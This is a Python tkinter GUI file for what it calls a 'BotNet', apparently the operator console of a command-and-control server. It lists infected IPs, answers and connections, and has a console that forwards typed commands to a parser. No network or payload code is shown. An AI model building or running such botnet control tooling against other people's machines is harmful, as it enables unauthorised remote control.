from tkinter import *
from tkinter import ttk
from tkinter.ttk import Combobox
from Functions import setMessage, setApp
from Functions import connections
from Functions import getSocket
from Parser import Parser

   
def build(typeScheduler, typeMemory, ios, configOs):
    ''
    
class StdoutRedirector(object):
    def __init__(self,text_widget):
        self.text_space = text_widget

    def write(self,string):
        self.text_space.insert('end', string)
        self.text_space.see('end')

class AppNew:
    
    def __init__(self, master=None):        
        self.titleApp = "BotNet"
        self.sizeWindowX = 1500
        self.sizeWindowY = 300   
        
        self.parser = Parser()
        self.initTK()
        setApp(self)
        
    def initTK(self):
        self.root = Tk()
        self.style = ttk.Style()
        self.root.title(self.titleApp) 
       
        self.right = ttk.Frame(self.root, width = self.sizeWindowX//2, height= self.sizeWindowY)
        self.left = ttk.Frame(self.root, width = self.sizeWindowX//2, height= self.sizeWindowY)
        
        self.createRight()
        self.createLeft()
        
        self.right.pack(side=RIGHT, expand=Y , fill=BOTH)
        self.left.pack(side=LEFT, expand=Y, fill=BOTH)
        
        self.root.update()      
    
    def createRight(self): 
        frmRight = ttk.Frame(self.right)
        frmRight.pack(side=TOP, fill=BOTH, expand=Y)
         
        self.pw = ttk.PanedWindow(frmRight, orient=VERTICAL)
        self.pw.pack(side=TOP, expand=Y, fill=BOTH, pady=2, padx='2m')
        
        self.pw.add(Label(self.pw, text="Infeted Ips", background='black', foreground='white'))
        listIps = self.create_listbox_Ips(self.pw)
        self.pw.add(listIps)
        
        self.pw.add(Label(self.pw, text="Answers", background='black', foreground='white'))
        listAnswers = self.create_listbox_Answers(self.pw)
        self.pw.add(listAnswers)
        
        self.pw.add(Label(self.pw, text="Connections", background='black', foreground='white'))
        listConnections = self.create_listbox_Connections(self.pw)
        self.pw.add(listConnections)
                  
    def create_listbox_Ips(self, parent):
        f = ttk.Frame(parent)       
        self.listIps = Listbox(f)
        vscroll = ttk.Scrollbar(f, orient=VERTICAL,command=self.listIps.yview)
        self.listIps['yscrollcommand'] = vscroll.set
        vscroll.pack(side=RIGHT, fill=Y)
        self.listIps.pack(fill=BOTH, expand=Y)
        return f      

    def create_listbox_Connections(self, parent):
        f = ttk.Frame(parent)        
        self.create_listbox_Connections = Listbox(f)
        vscroll = ttk.Scrollbar(f, orient=VERTICAL, command=self.create_listbox_Connections.yview)
        self.create_listbox_Connections['yscrollcommand'] = vscroll.set
        vscroll.pack(side=RIGHT, fill=Y)
        self.create_listbox_Connections.pack(fill=BOTH, expand=Y)         
        return f   
            
    def create_listbox_Answers(self, parent):        
        f = ttk.Frame(parent)        
        self.listboxInterruption = Listbox(f)
        vscroll = ttk.Scrollbar(f, orient=VERTICAL, command=self.listboxInterruption.yview)
        self.listboxInterruption['yscrollcommand'] = vscroll.set
        vscroll.pack(side=RIGHT, fill=Y)
        self.listboxInterruption.pack(fill=BOTH, expand=Y)         
        return f        
            
    def createLeft(self):
        frmLeft = ttk.Frame(self.left)
        frmLeft.pack(side=TOP, fill=BOTH, expand=Y)
         
        pw = ttk.PanedWindow(frmLeft, orient=VERTICAL)
        pw.pack(side=TOP, expand=Y, fill=BOTH, pady=2, padx='2m')
 
        top = self.createTextBoxForCommand(pw)
        pw.add(top)
        
        bot = self.createTextRecord(pw)
        pw.add(bot)
        
    def createTextRecord(self, frameParent):
        f = ttk.Frame(frameParent)        
        label = Label(f, text="View Select", background='black', foreground='white')
        label.pack(fill=BOTH)
        lb = Text(f)
        sys.stdout = StdoutRedirector(lb)  
        # add a vertical scrollbar
        vscroll = ttk.Scrollbar(f, orient=VERTICAL, command=lb.yview)
        lb['yscrollcommand'] = vscroll.set
        vscroll.pack(side=RIGHT, fill=Y)
        lb.pack(fill=BOTH, expand=Y)         
        return f    
    
    def createTextBoxForCommand(self, frameParent):
        frmTextBox = ttk.Frame(frameParent)
        labelPwd = Label(frmTextBox, text="ServerConsole", background='black', foreground='white')
        labelPwd.pack(fill=BOTH)
        textBox = Text(frmTextBox, height=10, width=60)
        textBox.bind('<Return>', self.getCommand)
        textBox.pack(fill=BOTH)
        return frmTextBox
        
    def getCommand(self, event):
        text = event.widget.get(1.0, END) 
        self.parser.execCommand(text)
        print("System send: " + text)
        event.widget.delete(1.0, END)         
